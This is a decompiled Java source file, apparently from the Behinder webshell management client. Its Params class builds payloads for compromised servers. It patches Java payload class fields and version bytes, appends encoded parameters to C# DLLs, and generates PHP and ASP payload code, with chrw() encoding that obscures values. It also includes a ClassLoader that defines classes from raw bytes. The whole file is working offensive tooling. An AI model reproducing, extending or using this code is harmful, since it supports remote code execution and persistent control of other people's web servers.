// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.core;

import java.io.InputStream;
import net.rebeyond.behinder.utils.ReplacingInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ByteArrayInputStream;
import java.util.Iterator;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import org.objectweb.asm.FieldVisitor;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.ClassAdapter;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.ClassReader;
import net.rebeyond.behinder.utils.Utils;
import java.util.Map;

public class Params
{
    public static byte[] getParamedClass(final String clsName, final Map<String, String> params) throws Exception {
        final String clsPath = String.format("net/rebeyond/behinder/payload/java/%s.class", clsName);
        final ClassReader classReader = new ClassReader(Utils.getResourceData(clsPath));
        final ClassWriter cw = new ClassWriter(1);
        classReader.accept((ClassVisitor)new ClassAdapter(cw) {
            public FieldVisitor visitField(final int arg0, final String filedName, final String arg2, final String arg3, final Object arg4) {
                if (params.containsKey(filedName)) {
                    final String paramValue = params.get(filedName);
                    return super.visitField(arg0, filedName, arg2, arg3, (Object)paramValue);
                }
                return super.visitField(arg0, filedName, arg2, arg3, arg4);
            }
        }, 0);
        final byte[] result = cw.toByteArray();
        result[7] = 50;
        return result;
    }
    
    public static byte[] getParamedClassForPlugin(final String payloadPath, final Map<String, String> params) throws Exception {
        final ClassReader classReader = new ClassReader(Utils.getFileData(payloadPath));
        final ClassWriter cw = new ClassWriter(1);
        classReader.accept((ClassVisitor)new ClassAdapter(cw) {
            public FieldVisitor visitField(final int arg0, final String filedName, final String arg2, final String arg3, final Object arg4) {
                if (params.containsKey(filedName)) {
                    final String paramValue = params.get(filedName);
                    return super.visitField(arg0, filedName, arg2, arg3, (Object)paramValue);
                }
                return super.visitField(arg0, filedName, arg2, arg3, arg4);
            }
        }, 0);
        final byte[] result = cw.toByteArray();
        return result;
    }
    
    public static byte[] getParamedAssembly(final String clsName, final Map<String, String> params) throws Exception {
        final String basePath = "net/rebeyond/behinder/payload/csharp/";
        final String payloadPath = basePath + clsName + ".dll";
        final byte[] result = Utils.getResourceData(payloadPath);
        if (params.keySet().size() == 0) {
            return result;
        }
        String paramsStr = "";
        for (final String paramName : params.keySet()) {
            final String paramValue = Base64.encode(params.get(paramName).toString().getBytes());
            paramsStr = paramsStr + paramName + ":" + paramValue + ",";
        }
        paramsStr = paramsStr.substring(0, paramsStr.length() - 1);
        final String token = "~~~~~~" + paramsStr;
        return Utils.mergeBytes(result, token.getBytes());
    }
    
    public static byte[] getParamedAssemblyClassic(final String clsName, final Map<String, String> params) throws Exception {
        final String basePath = "net/rebeyond/behinder/payload/csharp/";
        final String payloadPath = basePath + clsName + ".dll";
        final ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
        final ByteArrayOutputStream bos = new ByteArrayOutputStream();
        for (final String paraName : params.keySet()) {
            final String paraValue = params.get(paraName);
            final StringBuilder searchStr = new StringBuilder();
            while (searchStr.length() < paraValue.length()) {
                searchStr.append(paraName);
            }
            final byte[] search = Utils.ascii2unicode("~" + searchStr.substring(0, paraValue.length()), 0);
            final byte[] replacement = Utils.ascii2unicode(paraValue, 1);
            final InputStream ris = new ReplacingInputStream(bis, search, replacement);
            int b;
            while (-1 != (b = ris.read())) {
                bos.write(b);
            }
            ris.close();
        }
        return bos.toByteArray();
    }
    
    public static byte[] getParamedPhp(final String clsName, final Map<String, String> params) throws Exception {
        final String basePath = "net/rebeyond/behinder/payload/php/";
        final String payloadPath = basePath + clsName + ".php";
        final StringBuilder code = new StringBuilder();
        final ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
        final ByteArrayOutputStream bos = new ByteArrayOutputStream();
        int b;
        while (-1 != (b = bis.read())) {
            bos.write(b);
        }
        bis.close();
        code.append(bos.toString());
        String paraList = "";
        for (final String paraName : params.keySet()) {
            final String paraValue = params.get(paraName);
            code.append(String.format("$%s=\"%s\";", paraName, paraValue));
            paraList = paraList + ",$" + paraName;
        }
        paraList = paraList.replaceFirst(",", "");
        code.append("\r\nmain(" + paraList + ");");
        return code.toString().getBytes();
    }
    
    public static byte[] getParamedAsp(final String clsName, final Map<String, String> params) throws Exception {
        final String basePath = "net/rebeyond/behinder/payload/asp/";
        final String payloadPath = basePath + clsName + ".asp";
        final StringBuilder code = new StringBuilder();
        final ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
        final ByteArrayOutputStream bos = new ByteArrayOutputStream();
        int b;
        while (-1 != (b = bis.read())) {
            bos.write(b);
        }
        bis.close();
        code.append(bos.toString());
        String paraList = "";
        if (params.size() > 0) {
            paraList += "Array(";
            for (final String paraName : params.keySet()) {
                final String paraValue = params.get(paraName);
                String paraValueEncoded = "";
                for (int i = 0; i < paraValue.length(); ++i) {
                    paraValueEncoded = paraValueEncoded + "&chrw(" + (int)paraValue.charAt(i) + ")";
                }
                paraValueEncoded = paraValueEncoded.replaceFirst("&", "");
                paraList = paraList + "," + paraValueEncoded;
            }
            paraList += ")";
        }
        paraList = paraList.replaceFirst(",", "");
        code.append("\r\nmain " + paraList + "");
        return code.toString().getBytes();
    }
    
    public static class t extends ClassLoader
    {
        public Class get(final byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
}
